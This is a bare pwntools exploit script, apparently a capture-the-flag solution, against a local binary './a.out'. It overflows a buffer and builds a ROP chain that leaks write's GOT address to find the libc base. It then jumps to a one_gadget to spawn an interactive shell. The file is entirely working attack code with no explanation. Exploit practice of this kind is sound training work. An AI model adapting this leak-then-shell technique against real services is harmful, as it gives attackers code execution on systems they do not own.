#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./a.out"

pop_rdi_ret = 0x400a03
pop_rsi_pop_ret = 0x400a01
one_gadget1 = 0x4526a
fcn_test = 0x4007ed

write_got = 0x601018
write_plt = 0x400600
read_plt = 0x400640

system_off = 0x45390
write_off = 0xf72b0
read_off = 0xf7250
setbuf_off = 0x766b0
printf_off = 0x55800

p = process(elf)

p.recvuntil("welcome, please input your address:")

payload = "A"*0x28
payload += p64(0x99999999)
p.sendline(payload)

p.recvuntil("please input your name:")

payload = p8(0)*0x48
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_pop_ret)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)
payload += p64(fcn_test)
payload += p64(0)*8
p.sendline(payload)

libc_base = u64(p.recv(8))-write_off
log.info("libc_base: "+hex(libc_base))

one_gadget = libc_base+one_gadget1

p.recv(0xc0)

p.recvuntil("please input your name:")

payload = p8(0)*0x48
payload += p64(one_gadget)
p.sendline(payload)

p.interactive()
